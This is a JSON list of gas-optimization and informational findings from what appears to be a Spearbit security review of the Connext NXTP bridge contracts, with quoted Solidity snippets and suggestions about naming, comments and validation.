[{"title": "Optimize increment in insert()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The increment tree.count in function insert() can be optimized. function insert(Tree storage tree, bytes32 node) internal returns (uint256) { uint256 size = tree.count + 1; ... tree.count = size; ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Optimize calculation in loop of dequeueVerified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function dequeueVerified() can be optimized in the following way: (block.number - com- mitBlock >= delay) is the same as (block.number - delay >= commitBlock ) And block.number - delay is constant so it can be calculated outside of the loop. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { uint256 commitBlock = queue.commitBlock[last]; if (block.number - commitBlock >= delay) { ... } } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Cache array length for loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Fetching array length for each iteration generally consumes more gas compared to caching it in a variable.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization Diamond.sol#L35, Multicall.sol#L16, StableSwap.sol#L90, LibDi-"]}, {"title": "Use custom errors instead of encoding the error message", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TypedMemView.sol replicates the functionality provided by custom error with arguments: (, uint256 g) = encodeHex(uint256(typeOf(memView))); (, uint256 e) = encodeHex(uint256(_expected)); string memory err = string( abi.encodePacked(\"Type assertion failed. Got 0x\", uint80(g), \". Expected 0x\", uint80(e)) ); revert(err); encodeHex() is only used to encode a variable for an error message.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Avoid OR with a zero variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Boolean OR operation with a zero variable is a no-op. Highlighted code above perform a boolean OR operation with a zero variable which can be avoided: newView := or(newView, shr(40, shl(40, memView))) ... newView := shl(96, or(newView, _type)) // insert type ... _encoded |= _nibbleHex(_byte >> 4); // top 4 bits", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Use scratch space instead of free memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Memory slots 0x00 and 0x20 are scratch space. So any operation in assembly that needs at most 64 bytes of memory to write temporary data can use scratch space. Functions sha2(), hash160() and hash256() use free memory to write the intermediate hash values. The scratch space can be used here since these values fit in 32 bytes. It saves gas spent on reading the free memory pointer, and memory expansion.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Redundant checks in _processMessageFromRoot() of PolygonSpokeConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _processMessageFromRoot() of PolygonSpokeConnector does two checks on sender, which are the same: PolygonSpokeConnector.sol#L78-L82,  validateSender(sender) checks sender == fxRootTunnel  _setMirrorConnector() and setFxRootTunnel() set fxRootTunnel = _mirrorConnector and mirrorCon- nector = _mirrorConnector  require(sender == mirrorConnector, ...) checks sender == mirrorConnector which is the same as sender == fxRootTunnel. Note: the require in _setMirrorConnector() makes sure the values can't be updated later on. So one of the checks in function _processMessageFromRoot() could be removed to save some gas and to make the code easier 104 to understand. contract PolygonSpokeConnector is SpokeConnector, FxBaseChildTunnel { function _processMessageFromRoot(..., ... require(sender == mirrorConnector, \"!sender\"); ... address sender, ... ) validateSender(sender) { } function _setMirrorConnector(address _mirrorConnector) internal override { require(fxRootTunnel == address(0x0), ...); setFxRootTunnel(_mirrorConnector); } } abstract contract FxBaseChildTunnel is IFxMessageProcessor { function setFxRootTunnel(address _fxRootTunnel) public virtual { ... fxRootTunnel = _fxRootTunnel; // == _mirrorConnector } modifier validateSender(address sender) { require(sender == fxRootTunnel, ...); _; } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization PolygonSpokeConnector.sol#L61-L74,"]}, {"title": "Consider using bitmaps in _recordOutputAsSpent() of ArbitrumHubConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _recordOutputAsSpent() stores status via a mapping of booleans. However the equiv- alent function recordOutputAsSpent() of Arbritrum Nitro uses a mapping of bitmaps to store the status. Doing this saves gas. Note: this saving is possible because the index values are neatly ordered. function _recordOutputAsSpent(..., uint256 _index, ...) ... { ... require(!processed[_index], \"spent\"); ... processed[_index] = true; } Arbitrum version: function recordOutputAsSpent(..., uint256 index, ... ) ... { ... (uint256 spentIndex, uint256 bitOffset, bytes32 replay) = _calcSpentIndexOffset(index); if (_isSpent(bitOffset, replay)) revert AlreadySpent(index); spent[spentIndex] = (replay | bytes32(1 << bitOffset)); }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Move nonReentrant from process() to proveAndProcess()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function process() has a nonReentrant modifier. The function process() is also internal and is only called from proveAndProcess(), so it also possible to move the nonReentrant modifier to function proveAndProcess(). This would save repeatedly setting and unsetting the status of nonReentrant, which saves gas. function proveAndProcess(...) ... { ... for (uint32 i = 0; i < _proofs.length; ) { process(_proofs[i].message); unchecked { ++i; } } } function process(bytes memory _message) internal nonReentrant returns (bool _success) { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "OpenZeppelin libraries IERC20Permit and EIP712 are final", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The OpenZeppelin libraries have changed IERC20Permit and EIP712 to a final version, so the final versions can be used. OZERC20.sol import \"@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol\"; import {EIP712} from \"@openzeppelin/contracts/utils/cryptography/draft-EIP712.sol\"; draft-IERC20Permit.sol // EIP-2612 is Final as of 2022-11-01. This file is deprecated. import \"./IERC20Permit.sol\"; draft-EIP712.sol // EIP-712 is Final as of 2022-08-11. This file is deprecated. import \"./EIP712.sol\";", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use Foundry's multi-chain tests", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Foundry supports multi-chain testing that can be useful to catch bugs earlier in the development process. Local multi-chain environment can be used to test many scenarios not possible on test chains or in production. Since Connectors are a critical part of NXTP protocol.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Risk of chain split", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Domains are considered immutable (unless implementation contracts are redeployed). In case of chain splits, both the forks will continue having the same domain and the recipients won't be able to differentiate which source chain of the message.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use zkSync's custom compiler for compiling and (integration) testing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The protocol needs to be deployed on zkSync. For deployment, the contracts would need to be compiled with zkSync's custom compiler. The bytecode generated by the custom Solidity compiler is quite dif- ferent compared to the original compiler. One thing to note is that cryptographic functions in Solidity are being replaced/inlined to static calls to zkSync's set of system precompile contracts.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Shared logic in SwapUtilsExternal and SwapUtils can be consolidated or their changes would need to be synched.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The SwapUtilsExternal library and SwapUtils share quite a lot of functions (events/...) logics . The main differences are:  SwapUtilsExternal.swap does not have the following check but SwapUtils.swap does: // File: connext/libraries/SwapUtils.sol#L715 require(dx == tokenFrom.balanceOf(address(this)) - beforeBalance, \"no fee token support\"); This is actually one of the big/important diffs between current SwapUtils and SwapUtilsExternal. Other differ- ences are:  Some functions are internal in SwapUtils, but they are external/public in SwapUtilsExternal.  AmplificationUtils is basically copied in SwapUtilsExternal and its functions have been made external.  SwapUtilsExternal does not implement exists.  SwapUtilsExternal does not implement swapInternal.  The SwapUtils's Swap struct has an extra field key as do the events in this file.  Some inconsistent formatting. 109", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document why < 3s was chosen as the timestamp deviation cap for price reporting in setDirect- Price", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "setDirectPrice uses the following require statement to filter direct price reports by the owner. require(_timestamp - block.timestamp < 3, \"in future\"); Only prices with _timestamp within 3s of the current block timestamp are allowed to be registered.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document what IConnectorManager entities would be passed to BridgeFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Document what type of IConnectorManager implementations would the owner or an admin set for the s.xAppConnectionManager. The only examples in the codebase are SpokeConnectors.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Second nonReentrant modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A previous version of xcall() had a nonReentrant modifier. This modifier was removed to enable execute() to call xcall() to return data to the originator chain. To keep a large part of the original protec- tion it is also possible to use a separate nonReentrant modifier (which uses a different storage variable) for xcall()/xcallIntoLocal(). This way both execute and xcall()/xcallIntoLocal() can be called once at the most. function xcall(...) ... { } function xcallIntoLocal(...) ... { } function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Return 0 in swapToLocalAssetIfNeeded()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The return in function swapToLocalAssetIfNeeded() could also return 0. Which is somewhat more readable and could save some gas. Note: after studying the compiler output it might not actually save gas. 111 function swapToLocalAssetIfNeeded(...) ... { if (_amount == 0) { return _amount; } ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use contract.code.length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Retrieving the size of a contract is done in assembly, with extcodesize(). This can also be done in solidity which is more readable. Note: assembly might be a bit more gas efficient, especially if optimized even further: see issue \"isLocalOrigin can be optimized by using a named return parameter\". LibDiamond.sol function enforceHasContractCode(address _contract, string memory _errorMessage) internal view { uint256 contractSize; assembly { contractSize := extcodesize(_contract) } require(contractSize != 0, _errorMessage); } AssetLogic.sol function isLocalOrigin(address _token, AppStorage storage s) internal view returns (bool) { ... uint256 _codeSize; // solhint-disable-next-line no-inline-assembly assembly { _codeSize := extcodesize(_token) } return _codeSize != 0; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "cap and liquidity tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function addLiquidity() also adds tokens to the Connext Diamond contract. If these tokens are the same as canonical tokens it wouldn't play nicely with the cap on these tokens. For others tokens it might also be relevant to have a cap. function addLiquidity(...) ... { ... token.safeTransferFrom(msg.sender, address(this), amounts[i]); ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Simplify _swapAssetOut()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _swapAssetOut() has relative complex logic where it first checks the tokens that will be received and then preforms a swap. It prevents reverting by setting the success flag. However function repayAave- Portal() still reverts if this flag is set. The comments show this was meant for reconcile(), however repaying the Aave dept in the reconcile phase no longer exists. So _swapAssetOut() could just revert if insufficiently tokens are provided. This way it would also be more similar to _swapAsset(). This will make the code more readable and safe some gas. AssetLogic.sol 113 function _swapAssetOut(...) ... returns ( bool success, ...) { ... if (ipool.exists()) { ... // Calculate slippage before performing swap. // NOTE: This is less efficient then relying on the `swapInternalOut` revert, but makes it ,! easier // to handle slippage failures (this can be called during reconcile, so must not fail). ... if (_maxIn >= ipool.calculateSwapInv(tokenIndexIn, tokenIndexOut, _amountOut)) { success = true; amountIn = ipool.swapInternalOut(tokenIndexIn, tokenIndexOut, _amountOut, _maxIn); } } else { ... uint256 _amountIn = pool.calculateSwapOutFromAddress(_assetIn, _assetOut, _amountOut); if (_amountIn <= _maxIn) { success = true; ... amountIn = pool.swapExactOut(_amountOut, _assetIn, _assetOut, _maxIn, block.timestamp + ,! 3600); } } } function swapFromLocalAssetIfNeededForExactOut(...) { ... return _swapAssetOut(_key, _asset, adopted, _amount, _maxIn); } PortalFacet.sol function repayAavePortal(...) { ... (bool success, ..., ...) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(...); if (!success) revert PortalFacet__repayAavePortal_swapFailed(); ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Return default false in the function end", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "verify function is missing a default return value. A return value of false can be added on the function end", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Change occurances of whitelist to allowlist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the codebase, whitelist is used to represent entities or objects that are allowed to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment on _mirrorConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The comment on _mirrorConnector is incorrect as this does not denote address of the spoke connector", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "addStableSwapPool can have a more suggestive name and also better documentation for the _- stableSwapPool input parameter is recommended", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "1. The name suggests we are adding a new pool, although we are replacing/updating the current one. 2. _stableSwapPool needs to implement IStableSwap and it is supposed to be an external stable swap pool. It would be best to indicate that and possibly change the parameter input type to IStableSwap _stableSwap- Pool. 3. _stableSwapPool provided by the owner or an admin can have more than just 2 tokens as the @notice comment suggests. For example, the pool could have oUSDC, nextUSDC, oDAI, nextDAI, ... . Also there are no guarantees that the pooled tokens are pegged to each other. There is also a potential of having these pools have malicious or worthless tokens. What external pools does Connext team uses or is planning to use? This comment also applies to setupAsset and setupAssetWithDeployedRepresentation.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "_local has a misleading name in _addLiquidityForRouter and _removeLiquidityForRouter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The name for _local parameter is misleading, since it has been used in _addLiquidityForRouter (TokenId memory canonical, bytes32 key) = _getApprovedCanonicalId(_local); and in _removeLiquidityForRouter TokenId memory canonical = _getCanonicalTokenId(_local); and we have the following call flow path: AssetLogic.getCanonicalTokenId uses the adoptedToCanonical mapping first then check if the input parameter is a canonical token for the current domain, then uses representationToCanonical mapping. So here _local could be an adopted token.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document _calculateSwap's and _calculateSwapInv's calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In _calculateSwap, the -1 in dy = xp[tokenIndexTo] - y - 1 is actually important. This is be- cause given no change in the asset balance of all tokens that already satisfy the stable swap invariant (dx = 0), getY (due to rounding errors) might return:  y = xp[tokenIndexTo] which would in turn make dy = -1 that would revert the call. This case would need to be investigated.  y = xp[tokenIndexTo] - 1 which would in turn make dy = 0 and so the call would return (0, 0).  y = xp[tokenIndexTo] + 1 which would in turn make dy = -2 that would revert the call. This case would need to be investigated. 117 And similiarly in _calculateSwapInv, doing the same analysis for + 1 in dx = x - xp[tokenIndexFrom] + 1, if getYD returns:  xp[tokenIndexFrom] +1, then dx = 2;  xp[tokenIndexFrom], then dx = 1;  xp[tokenIndexFrom] - 1, then dx = 0; Note, that the behavior is different and the call would never revert.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Providing the from amount the same as the pool's from token balance, one might get a different return value compared to the current pool's to balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Note, due to some imbalance in the asset pool, given x = xp[tokenIndexFrom] (aka, no change in asset balance of tokenIndexFrom token in the asset pool), we might see a decrease or increase in the asset balance of tokenIndexTo to bring back the pool to satisfying the stable swap invariant. One source that can introduce an imbalance is when the scaled amplification coefficient is ramping.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document what type 0 means for TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the following line, 0 is passed as the new type for a TypedMemView bytes29 _message.slice(PREFIX_LENGTH, _message.len() - PREFIX_LENGTH, 0) But there is no documentation as to what type 0 signifies.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Mixed use of require statements and custom errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The codebase includes a mix of require statements and custom errors.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "WatcherManager can make watchers public instead of having a getter function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "WatcherManager has a private mapping watchers and a getter function isWatcher() to query that mapping. Since WatcherManager is not inherited by any other contract, it is safe to make it public to avoid the need of an explicit getter function.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment about relation between zero amount and asset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "At BridgeFacet.sol#L514, if _amount == 0, _asset is allowed to have any user-specified value. _- xcall() reverts when zero address is specified for _asset on a non-zero _amount: if (_asset == address(0) && _amount != 0) { revert BridgeFacet__xcall_nativeAssetNotSupported(); } However, according to this comment if amount is 0, _asset also has to be the zero address which is not true (since it uses IFF): _params.normalizedIn = _asset == address(0) ? 0 // we know from assertions above this is the case IFF amount == 0 : AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount);", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "New Connector needs to be deployed if AMB changes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The AMB address is configured to be immutable. If any of the chain's AMB changes, the Connector needs to be deployed. /** * @notice Address of the AMB on this domain. */ address public immutable AMB;", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Functions should be renamed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The following functions should be renamed to be aligned with the naming convention of the fxPortal contracts.  OptimismHubConnector.processMessageFromRoot to OptimismHubConnector.processMessageFromChild  ArbitrumHubConnector.processMessageFromRoot to ArbitrumHubConnector.processMessageFromChild  ZkSyncHubConnector.processMessageFromRoot to ZkSyncHubConnector.processMessageFromChild", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Twice function aggregate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Both the contracts Multicall and RootManager have a function called aggregate(). This could be confusing. Contract Multicall doesn't seem to be used. Multicall.sol function aggregate(Call[] memory calls) public view returns (uint256 blockNumber, bytes[] memory returnData) { ... ,! } RootManager.sol 120 function aggregate(uint32 _domain, bytes32 _inbound) external whenNotPaused onlyConnector(_domain) { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Careful when using _removeAssetId()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _removeAssetId() removes an assets. Although it is called via authorized functions, mistakes could be made. It there are any representation assets left, they are worthless as they can't be bridged back anymore (unless reinstated via setupAssetWithDeployedRepresentation()). The representation assets might also be present and allowed in the StableSwap. If so, the owners of the worthless tokens could quickly swap them for real tokens. The canonical tokens will also be locked. function _removeAssetId(...) ... { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Unused import IAavePool in InboxFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Contract InboxFacet imports IAavePool, however it doesn't use it. import {IAavePool} from \"../interfaces/IAavePool.sol\";", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use IERC20Metadata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "interface. pelin/contracts/token/ERC20/extensions/IERC20Metadata.sol, which seems more logical. BridgeFacet.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function _xcall(...) ... { ... ... AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); ... } AssetLogic.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function swapToLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(ERC20(_asset).decimals(), ERC20(_local).decimals(), _amount, _slippage) ... ... ,! } function swapFromLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(uint8(18), ERC20(adopted).decimals(), _normalizedIn, _slippage) ... ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Generic name of proposedTimestamp()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function proposedTimestamp() has a very generic name. As there are other Timestamp func- tions this might be confusing. function proposedTimestamp() public view returns (uint256) { return s._proposedOwnershipTimestamp; } function routerWhitelistTimestamp() public view returns (uint256) { return s._routerWhitelistTimestamp; } function assetWhitelistTimestamp() public view returns (uint256) { return s._assetWhitelistTimestamp; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Two different nonces", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Both LibConnextStorage and SpokeConnector define a nonce. As the names are very similar this could be confusing. LibConnextStorage.sol struct AppStorage { ... * @notice Nonce for the contract, used to keep unique transfer ids. * @dev Assigned at first interaction (xcall on origin domain). uint256 nonce; ... } SpokeConnector.sol * @notice domain => next available nonce for the domain. mapping(uint32 => uint32) public nonces;", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Tips to optimize rootWithCtx", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "To help with the optimization mentioned in the comment of rootWithCtx(), here is a way to count the trailing 0s: graphics.stanford.edu/~seander/bithacks.html#ZerosOnRightModLookup. function rootWithCtx(Tree storage tree, bytes32[TREE_DEPTH] memory _zeroes) internal view returns (bytes32 _current) { ... // TODO: Optimization: skip the first N loops where the ith bits are all 0 - start at that // depth with zero hashes. ... ,! }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use delete", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The functions _setOwner() and removeRouter() clear values by setting them to 0. Other parts of the code use delete. So using delete here too would be more consistent. ProposedOwnable.sol function _setOwner(address newOwner) internal { ... _proposedOwnershipTimestamp = 0; _proposed = address(0); ... } RoutersFacet.sol function removeRouter(address router) external onlyOwnerOrRouter { ... s.routerPermissionInfo.routerOwners[router] = address(0); ... s.routerPermissionInfo.routerRecipients[router] = address(0); ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "replace usages of abi.encodeWithSignature and abi.encodeWithSelector with abi.encodeCall to ensure typo and type safety", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": " When abi.encodeWithSignature is used the compiler does not check for mistakes in the signature or the types provided.  When abi.encodeWithSelector is used the compiler does not check for parameter type inconsistencies.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "setAggregators is missing checks against address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "setAggregators does not check if tokenAddresses[i] or sources[i] is address(0).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "setAggregators can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "setAggregators does not check if tokenAddresses length is equal to sources to revert early.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Event is not emitted when an important action happens on-chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "No event is emitted when an important action happens on-chain.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Add unit/fuzz tests to make sure edge cases would not cause an issue in Queue._length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "It is always assumed last + 1 >= first. It would be great to add unit/fuzz tests to check for this invariant. Adding these tests", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Consider using prefix(...) instead of slice(0,...)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "tokenId() calls TypedMemView.slice() function to slice the first few bytes from _message: return _message.slice(0, TOKEN_ID_LEN, uint40(Types.TokenId)); TypedMemView.prefix() can also be used here since it achieves the same goal.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Elaborate TypedMemView encoding in comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TypedMemView describes its encoding in comments as: // next 12 are memory address // next 12 are len // bottom 3 bytes are empty The comments can be elaborated to make them less ambiguous.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Remove Curve StableSwap paper URL", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "www.curve.fi/stableswap-paper.pdf The current working URL is curve.fi/files/stableswap-paper.pdf. to Curve StableSwap paper referenced in comments Link is no longer active:", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Missing Validations in AmplificationUtils.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "1. If initialAPrecise=futureAPrecise then there will not be any ramping. 2. In stopRampA function, self.futureATime > block.timestamp can be revised to self.futureATime >= block.timestamp since once current timestamp has reached futureATime, futureAprice will be returned al- ways.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect PriceSource is returned", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Price Source is returned incorrectly in case of stale prices as shown below 1. getTokenPrice function is called with _tokenAddress T1. 2. Assume the direct price is stale, so tokenPrice is set to 0. uint256 tokenPrice = assetPrices[tokenAddress].price; if (tokenPrice != 0 && ((block.timestamp - assetPrices[tokenAddress].updatedAt) <= VALID_PERIOD)) { return (tokenPrice, uint256(PriceSource.DIRECT)); } else { tokenPrice = 0; } 3. Now contract tries to retrieve price from oracle. In case the price is outdated, the returned price will again be 0 and source would be set to PriceSource.CHAINLINK. if (tokenPrice == 0) { tokenPrice = getPriceFromOracle(tokenAddress); source = PriceSource.CHAINLINK; } 128 4. Assuming v1PriceOracle is not yet set, contract will simply return the price and source which in this case is 0, PriceSource.CHAINLINK. In this case amount is correct but source is not correct. return (tokenPrice, uint256(source));", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "PriceSource.DEX is never used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The enum value DEX is never used in the contract and can be removed.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment about handleOutgoingAsset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The comment is incorrect as this function does not transfer funds to msg.sender. /** * @notice Handles transferring funds from the Connext contract to msg.sender. * @param _asset - The address of the ERC20 token to transfer. * @param _to - The recipient address that will receive the funds. * @param _amount - The amount to withdraw from contract. */ function handleOutgoingAsset( address _asset, address _to, uint256 _amount ) internal {", 